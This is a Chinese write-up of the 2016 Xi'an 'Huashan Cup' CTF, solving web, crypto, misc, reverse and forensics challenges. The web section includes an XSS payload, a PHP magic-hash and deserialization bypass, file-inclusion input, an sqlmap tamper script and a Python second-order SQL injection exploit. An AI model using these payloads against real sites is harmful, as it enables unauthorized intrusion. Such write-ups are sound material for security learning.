---
title: 2016中国·西安“华山杯”WriteUp-SeeSea
---
题目打包下载：[https://yunpan.cn/ckyrKxHJDPAIN]() （提取码：bbaf）

# Web
### 1、签到(10)
> 扫码回复 `hs_ctf`拿flag,  套路题。

`flag_Xd{hSh_ctf:WelcomeTo2016XiDian&HumenHS}`

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/61851063.jpg)

### 2、打不过~(50)
> 打不过绕道走~ http://huashan.xdsec.cn/ctf_hs_00b.php

直接将submit按钮改成可点击，然后抓包，发现`str`值为`OGM0MzU1NTc3MTdhMTQ4NTc4ZmQ4MjJhYWVmOTYwNzk=`，拿出来解base64，然后再解一道md5，得到是`1931b`，然后提交`Password=1931b`，得flag:`flag_Xd{hSh_ctf:XD_aA@lvmM}`

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/93429080.jpg)

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/35641631.jpg)


### 3、系统管理(100)
> http://huashan.xdsec.cn/xt  账户:admin  密码:admin  请登陆
首次发包，返回部分源码，是`username`的md5值为0，所以令`username`值为`QNKCDZO`。

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/25806101.jpg)

然后返回了`user.php`，然后对`user.php`进行发包。看到了新的源码，是一个反序列化漏洞。然后构造`password=a:2:{s:4:"user";b:1;s:4:"pass";b:1;}`，向`index.php`发包。得到flag:`flag_Xd{hSh_ctf:kidhvuensl^$}`。

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/63995380.jpg)

###4、简单js(100)
> 来道js前菜，热身一下吧~  http://huashan.xdsec.cn/jdjs

进去后不能右键源码，其实各种查看源码的法子，例如火狐f12打开firebug，然后源码里就是简单的js而已

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:08:21%20)

在控制台里运行即可得到key值，submit得到flag。或者干脆直接onclick="return check();"去掉


###5、弹弹弹！(150)
> 弹出鱼尾纹！~  http://huashan.xdsec.cn/ctf_hs_00a.php

很简单的xss，过滤不严，
`<BODY ONLOAD=alert('XSS')> `

xss，直接构造payload`<BODY%2BONLOAD%253Dalert%2528%2527XSS%2527%2529>`

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg)

###6、233(150)
> 少年，老套路，你都懂得~  http://huashan.xdsec.cn/233/

查看源代码 能看到是JSfuck编码 解码

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20)

得到加密后的一句话木马
**┼攠數畣整爠煥敵瑳∨䁥祳ぴ㍧≴┩>**
解密得到一句话密码`e@syt0g3t`
得到 `flag_Xd{hSh_ctf:e@syt0g3t}`

###7、无间道(200)
> 无间道：放你的人来我这？~ http://huashan.xdsec.cn/upload/index.php

利用“php很烦人”那题得到index.php源码，flag就在其中

正确解法：
一道上传截断题目,过程不多说。直接fuzz %80~%00中间的字符,即可上传成功,得到返回的flag。由于上传删除文件的过程有延时,可能存在竞争上传问题。

###8、Mory try
没做出来
看了师傅们的wp
过程大概是
**role参数里是两次base64编码，测试后可以注入。使用sqlmap的random user-agent绕过一下，并编写两次base64的tamper：**

```python
#!/usr/bin/env python
# Copyright (c) 7 team  All rights reserved
from lib.core.enums import PRIORITY
from urllib import urlencode
import base64
import urllib
__priority__ = PRIORITY.LOW
def tamper(payload):
    retVal = payload
    retVal = base64.b64encode(retVal)
    retVal = base64.b64encode(retVal)
    retVal = urllib.quote(retVal)
    return retVal
```

然后就能得到flag
`flag_xd{hsh_ctf:sql_succeed!}`


###9、php很烦人(200)
> 但php仍然是世界上最好的语言   http://huashan.xdsec.cn/php/
发包，看到源码。

```php
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```

是让传三个参数`user,file,pass`，然后先构造`user=php://input`,post值`the user is admin`。`file=class.php`，`pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}`反序列化去读取`f1a9.php`。直接出`flag`。

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg)

###10 、三秒钟记忆(300)
> 三秒钟记忆

最近只有三秒钟记忆，忘记的事情总是要一遍一遍的找回来...
http://huashan.xdsec.cn/pic

这题也没做出来

也是看了师傅们的wp
**`二次注入，触发点在密码找回那边。exp：`**

```python
import requests
import base64
import os
import random
#by mathias@xdsec
# Copyright (c) 7 team  All rights reserved
def regist(usr):
    flag=False
    url="http://huashan.*****.cn/pic/index.php?page=login"
    payload={'name':usr,'pass':'123456','email':'123456','register':'%E6%B3%A8%E5%86%8C'}
    r=requests.post(url,data=payload)
    txt=r.text.encode('utf-8')
    if 'Duplicate' in txt or len(txt)==503:
        flag=True
    return flag

def reset(usr):
    flag=False
    url="http://huashan.*****.cn/pic/index.php?page=login"
    payload={'name':usr,'reset':'%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81'}
    r=requests.post(url,data=payload)
    if len(r.text)==460:
        flag=True
    return flag

if __name__=="__main__":

    url="http://huashan.*****.cn/pic/index.php?page=login"
    flag=False
    user=str(random.randint(10000000000,99999999999))
    p=user+'\' and (select ascii(substr(flag,1,1)) from flag)>50#'
    flag=regist(user)
    if not flag:
        print "regist "+user+" error"
        os._exit()
    else:
        print "regist "+user+" success"

    flag=regist(p)
    if not flag:
        print "regist "+p+" error"
        os._exit()
    else:
        print "regist "+p+" success,now reset password"

    flag=reset(p)
    if flag:
        print "Reset success,now inject"
    else:
        print "reset "+p+" error"
        os._exit()

    url="http://huashan.*****.cn/pic/index.php?page=login"
    payload={'name':user,'pass':'123456','login':'%E7%99%BB%E5%BD%95'}
    r=requests.post(url,data=payload)
    if len(r.text)==486:
        print "payload is wrong"
    else:
        print "payload is right"
```

###11、疯狂的JS(300)
>疯狂的js，老师给我布置了一道js题，作为js小白的我做不到啊，大家帮忙看看吧~

这个也是没做出来的
**题在出题过程中可能借鉴了** [这里](https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/halphow2js)
payload：http://js.xdsec.cn/myajax?a=2.0&b=2.00&c=2.000&d=7&e=762

# Crypto
###1、紧急报文
> 解密一下这份截获的密文吧，时间就是机会！
FA XX DD AG FF XG FD XG DD DG GA XF FA

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20)

###2、is it x or z ?
> is it x or z ?
100
你可以解密这些残损的文件吗？

明文1和密文1异或得到key
密文2的key从最后个字母f开始循环
异或得到明文2

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20)

```python
# -*- coding: cp936 -*-
import binascii
import struct

#每个字节转成hex，0x顺便去掉，对于不足两位的补0
def str2hex(str):
    hexs = []
    for s in str:
        tmp = (hex(ord(s)).replace('0x',''))
        if len(tmp) == 2:
            hexs.append(tmp)
        else:
            hexs.append('0'+tmp)
    return hexs

arr  = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
arr2 = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]

def tran(r):
    for i in range(len(arr)):
        if r == arr[i]:
            return arr2[i]



f = open('crypt-2.txt','rb')
f2 = open('key.txt','rb')
hexs = []
hexs2 = []
while True:
    t = f.readline()
    t2 = f2.readline()
    if not t or not t2:
        break
    hexs.extend(str2hex(t))
    hexs2.extend(str2hex(t2))
f.close()
f2.close()

ff = open('out.txt','wb')
for i in range(min(len(hexs),len(hexs2))):
    a = tran(hexs[i][0])*16+tran(hexs[i][1])
    b = tran(hexs2[i][0])*16+tran(hexs2[i][1])
    B = struct.pack('B',a^b)
    ff.write(B)
ff.close()

```

### 3、分组加密检测(150)
> 分组加密模式检测

文件（challenge.txt）包含base64编码后的密文，其中某段密文采用的加密模式不太一样，请找出，并以该段密文base64解码后的前16个字符作为flag提交。

先全部base64解码 然后再去检测
[Github](https://github.com/truongkma/ctf-tools/tree/master/cryptopals-solutions-master/set1/8)上面有项目 下载下来跑一下就是了

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20)

### 4、修复一下这份邀请函部分内容(200)
> 修复一下这份邀请函的部分内容


![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20)

红色部分就是flag 了

### 5、时间决定一切(350)
> 时间决定一切

考验大家人品的时候到啦！！！
http://huashan.xdsec.cn/mima/

利用“php很烦人”那题得到index.php源码，flag就在其中

[参考链接](https://github.com/SpiderLabs/CryptOMG/blob/master/ctf/challenge3/index.php)

```bash
$ echo gjVGaqJZOnjm54LirXgElRIAOnb8oVEWfkj/7medMRU= | base64 -d | xxd
00000000: 8235 466a a259 3a78 e6e7 82e2 ad78 0495  .5Fj.Y:x.....x..
00000010: 1200 3a76 fca1 5116 7e48 ffee 679d 3115  ..:v..Q.~H..g.1.
```

从侧信道攻击的角度考虑，我们可以依次比较每个字符，对于不同的输入数据，执行10000次操作，耗费的时间是不同的，这样逐个字符破解，就可以得到目标值。

###6、 协议？认证？加密？(300)
>协议？认证？加密？

安全也需要融合！


```python
# Copyright (c) 7 team  All rights reserved
from Crypto.Cipher import AES
from binascii import *
import gmpy2
import re
g = 7
p = 1023789085312022807
A = 651518302569801068
B = 310117834581236149
secret = 0x5365637263742064617461210a2fa0c7a10e0d87a58f52bd
#flag = 'KeyXchge-N0t-So-Easy*Humen'

a = 1

myA = 7
a = 274389752
s = gmpy2.powmod(B, a, p)
#s = 844469193616983517
print s
key = s
print len(key)
length = 128
count = len(key)
if count != length:
    key = b'0' * (length - count) + bin(key)[2:]
mode = AES.MODE_CBC
#print len(key)

char = re.findall(r'.{8}', key)
string = ''
for cha in char:
    cha = hex(int(cha, 2))
    #cha = cha & 0xff
    #string += chr(int(cha, 16))
    string  = a2b_hex(cha)
key = string
print key
def decrypo(cipher):
    crypter = AES.new(bin(key), mode, bin(key))
    flag = crypter.decrypt(a2b_hex(cipher))
    print flag

flag = decrypo(secret)
print 'flag: ' + flag
```

# Misc
###1、Try Everything(200)
> Try Everything  try everything you can to get flag, and DO NOT ASK MANAGER THE FLAG.



这题的file若是直接解压的话，得到的内容是乱序的，但是仔细一看flag形式的字样都有，于是关键是如何调整顺序，这里借用binwalk

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20)

得到文件的偏移量
里面文件每个地址对应了不同的文件名（序号还不同），所以只要把里面的offset整理好，然后写个脚本分离源文件到各个小文件，然后解压，再按数字来排序就可以。
以下脚本基于自己先整理出了offset，以及建立了一个out文件夹

```python
# -*- coding: utf8 -*-
import gzip

def foo():
	f_all=open('file','rb').read()
	#print len(f_all)
	l1=[0   , 24  , 48  , 73  , 98  , 122 , 146 , 170 , 195 , 220 , 245 , 270 , 295 , 319 , 344 , 368 , 393 , 418 , 443 , 467 , 491 , 515 , 539 , 562 , 586 , 611 , 635 , 659 , 683 , 708 , 732 , 756 , 781 , 806 , 829 , 853 , 877 , 901 , 925 , 950 , 975 , 999 , 1024, 1048, 1071, 1095, 1120, 1144, 1168, 1192, 1216, 1241, 1265, 1290, 1315, 1340, 1364, 1389, 1412, 1436, 1460, 1484, 1508, 1533, 1557, 1582, 1607, 1631, 1656, 1681, 1705, 1729, 1753, 1777, 1802, 1825, 1849, 1873, 1898, 1923, 1947, 1971, 1995, 2020, 2044, 2069, 2094, 2118, 2143, 2167, 2191, 2215, 2239, 2264, 2288, 2313, 2338, 2363, 2387, 2412, 2437, 2462, 2486, 2511, 2536, 2560, 2584, 2609, 2634, 2658, 2682, 2707, 2731, 2755, 2780, 2805, 2829, 2854, 2878, 2902, 2926, 2950, 2974, 2998, 3022, 3046, 3071, 3096, 3120, 3145, 3170, 3195, 3220, 3245, 3269, 3293, 3316, 3340, 3364, 3389, 3413, 3437, 3462, 3486, 3511, 3534, 3559, 3583, 3607, 3631, 3655, 3679, 3704, 3727, 3751, 3774, 3798, 3822, 3847, 3870, 3894, 3918, 3942, 3966, 3990] #最后一个是len(f_all)
	l2=[24,72,108,129,18,92,63,162,110,156,132,101,34,143,28,136,115,114,17,14,69,10,7,11,127,55,58,86,149,21,41,120,142,6,22,36,37,88,133,161,35,137,31,3,20,113,46,42,91,78,102,19,135,153,105,48,107,9,68,64,81,93,147,67,138,160,85,106,154,75,89,66,26,141,2,98,96,124,145,84,71,15,140,90,144,100,61,131,27,23,53,40,130,47,117,148,150,50,111,122,146,57,121,123,82,45,152,109,62,70,116,77,12,139,155,80,103,13,74,16,51,94,87,97,25,151,128,54,125,112,119,118,158,99,95,4,38,79,157,29,33,134,30,126,1,104,52,65,44,83,73,163,0,76,5,60,59,159,8,49,32,43,56,39]

	fname_list=[]
	for i in xrange(len(l2)):
		s=f_all[l1[i]:l1[i+1]]
		fname=l2[i]
		#gz文件
		with open(r'out\%d.gz' %fname,'wb') as f:
			f.write(s)
		fname_list.append(fname)
	fname_list.sort() #从小到大排序

	flag=''
	for fname in fname_list:
		flag+=gzip.open(r'out\%d.gz' %fname,'rb').read()
	print flag
	pass

if __name__ == '__main__':
	foo()
	print 'ok'
```

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20)

###2、挣脱牢笼

# Reverse
###1、Waring Up(100)
> Warming Up

Crack the easy program crackme, the key is your correct inpu

Crack the easy program crackme, the key is your correct input
直接IDA打开，来到main_0()，程序主流程在这此函数里

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20)

v4获取输入，v3为输入字串长度，然后进sub_401005()进行字串处理，sub_40100A()为结果比较。先看下结果比较函数：

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20)

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20)

可以看出，处理过的输入与”VgobmndVlBVE”官串比较。
再看输入字串处理函数，sub_401005()直接跳到地址40DBF0。
关键处理操作如图：

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20)

写个小脚本

```python
target = "VgobmndVlBVE"
result = ""
for index, item in enumerate(target):
	result += chr(ord(item)^(((index)%3)+1))
print result

```

###2、到手的钥匙(100)
> 到手的钥匙。现在已经确定截获到一个对方用来传递密钥的程序，但是如何才能拿到密钥？



![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20)

一个是帐号 一个是密码

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20)

屏幕输出一堆奇怪的东西
帐号+密码+这一堆  就是flag了
###3、忘记用户名(100)
> 忘记用户名。过了好久，用户名都不记得了，难道只能重置了么



![](http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20)

 做了简单的加减

```python
a='ILoveXD'
ct=0
for c in a:
 print chr(ord(c)+7-ct)
 ct=ct+1
```
###4、Help me(150)
> Help me

What's wrong with my program? Who can crack this? Do me a favor...


直接扔进IDA，如图：

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20)

其中有些空代码，还有些不太正确的语句。程序是不能正常运行的。如开始处的v10,v0等。main()函数中前面一部分主要是一些打印语句，求字串长度及一些赋值操作。这里有四个赋值下面需要用到：

```
dword_40CF70 = 1;
dword_40CF74 = -1;
dword_40CF78 = -2;
v3 = lstrlenA(String);
```

再看下面的if语句

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20)

第一个if中的v3为String的长度，String为’rev3rs3_ana1ys1s’。里面是一个do…while语句，里面是一些if 语句，根据上面列出的赋值语句，直接到达下图的关键字串处理部分：

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20)

现在逻辑就很清晰了
字串与9异或，以16进制形式输出结果。用python计算结果如图

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20)

###5、捉迷藏(150)
 > 捉迷藏。文件一定要保存好，不要像这个程序一样随便一diu~  PS：建议在win32环境下测试

用IDA打开 能看到用户名

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20)

密码随便输入14个1，发现14个1变为base64编码和另一串比
下断点得到base64的编码，解码得到OnYourComputer

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20)

sub_13D1D00内会把用户名+密码+ArvinShow存到
系统临时目录/flag.jpg，flag即为

`FindKeyOnYourComputerArvinShow`

###6、移动迷宫(200)
> 移动迷宫。当赶到的时候发现对方已经提前接头了，但在现场遗留了一个U盘并恢复出了一个登陆程序，如何才能拿到密钥？



程序就是个简单的走迷宫
输入的东西，进行各简单变化，对应于走的方向

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20)

走的逻辑是

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20)

根据坐标生成方向即可，逆代码如下

```python
map_info = "***********####******#**#*****##*##********#*********#*#####***###***#*********#*********#********##"
result = ""
x = 0
y = 0

pos_list = []
for i in range(len(map_info)):
	result += map_info[i]

	y = (i)%10
	x = i/10
	if (i+1)%10 == 0:
		result += "\n"
	if map_info[i] == "#":
		pos_list.append((x, y))

print map_info[0x28]
print result
print pos_list

last = 0

way_list = []
way_list.append((1,0))
way_list.append((0,-1))
way_list.append((0,-1))
way_list.append((1,0))
way_list.append((1,0))
way_list.append((1,0))

way_list.append((0,1))
way_list.append((0,1))
way_list.append((-1,0))
way_list.append((0,1))
way_list.append((0,1))
way_list.append((0,1))

way_list.append((1,0))
way_list.append((1,0))
way_list.append((0,-1))

way_list.append((1,0))
way_list.append((1,0))
way_list.append((1,0))
way_list.append((1,0))

way_list.append((0,1))
way_list.append((0,1))
way_list.append((0,1))
way_list.append((0,1))
way_list.append((-1,0))

print len(way_list)
map_dic = {}
map_dic[(-1, 0)] = 3
map_dic[(1, 0)] = 4
map_dic[(0, -1)] = 1
map_dic[(0, 1)] = 2

result = []
for i in way_list:
	result.append(map_dic[i])


way_key = """0A1B
a2b3
4C5D
c6d7
8E9F
e0f1"""

way_key = way_key.split("\n")

print result
print len(result)
result_info = ""
for i in range(4):
	for j in range(6):
		result_info += way_key[j][result[i*6+j]-1]
print way_key
print result_info

```

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20)

###7、 Do something(200)
> Do something登录程序后收到了一张图片，这其中会有什么蹊跷？已更新，可以继续做题～binwalk从png中分离exe

```
程序让输入用户名 符合一系列条件
a1=a9
a1=aa
a2=ab
a3=a5
a4=a6
ac=5
a8=3*a 24
ad>5*a 4b
ae=2*a 1a
a4>3*a 27
a1>a4
21>a1
a1=ad+a7
a7=2*a 20
a3>4*a 3c
a7>a3
a3%3=0
a2>7
a3>a2
```
写给脚本跑一下

```python
# -*- coding: utf8 -*-
cnt = 0
a1=0
a2=0
a3=0
a4=0
a5=0
a6=0
a7=0
a8=0
a9=0
a10=0
a11=0
a12=5
a13=0
a14=0
a15=0
a16=0
for a1 in range(1,27):
 if 0x15<=a1:
  continue
 a9=a1
 a10=a1
 for a2 in range(1,27):
  a11=a2
  if a2<=7:
   continue
  for a3 in range(1,27):
   if a3%3!=0:
    continue
   a5=a3
   if a3<=a2:
    continue
   for a4 in range(1,27):
    a6=a4
    if a1<=a4:
     continue
    for a16 in range(1,27):
     a7=2*a16
     if a1>=a7:
      ad=a1-a7
     else:
      continue
     if a7<=a3:
      continue
     a12=5
     if 1==1:
      a8=3*a12
      for a13 in range(1,27):
       a14=2*a13
       if a4<=3*a13:
        continue
       for a15 in range(1,27):
        if a13<=5*a15:
         continue
        if a3<=4*a15:
         continue
        print chr(a1+96)+chr(a2+96)+chr(a3+96)+chr(a4+96)+chr(a5+96)+chr(a6+96)+chr(a7+96)+chr(a8+96)+chr(a9+96)+chr(a10+96)+chr(a11+96)+chr(a12+96)+chr(a13+96)+chr(a14+96)+chr(a15+96)+chr(a16+96)
```

得到

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20)

访问程序得到一个地址  访问地址  **http://reverse..cn/galfehttonsisiht.php**
就能得到flag了

# Forensics
### 1、蒲公英的约定

> 蒲公英的约定
100
题目描述？小学篱笆旁的 蒲公英~

这个简单 使用stegsolve打开

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20)

能看到一个二维码

反转一下颜色 然后 扫描就得到一个类似base64字符串，但其实是base32字符串，用python的base64.b32decode即可得到flag

###2、什么鬼(100)
> 什么鬼

你瞅啥？

binwal解压出一个压缩包

压缩包是有密码的  注释上写的4位数
爆破  得到密码 19bZ
打开压缩包是一个破损的二维码 PS一下就好了

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20)

###3、客官，听点小曲儿？

这题的mp3地址不是直接提供的，而是提供了一个网站，留意网页的header，里面有key为cherrs，而mp3最常见的隐写术就是mp3Stego，找一个解密即可
`Decode –X song.mp3 –P cheers`
得到
`fdc3_#l{tsf#ahfte}gs:en_hmgcX_poe`
就会生成文件，文件里内容是经过不规则的栅栏加密过，只要自己手工按照flag形式去调整下即可。
`flag_Xd{hSh_ctf:mp3stego_fence}`

### 4、网红之路

这个比赛之后才做出来的

![](http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20)

接着就是简单的编码问题了


# Finally
一个安卓都没做出来   好尴尬。。。。

![](http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg)
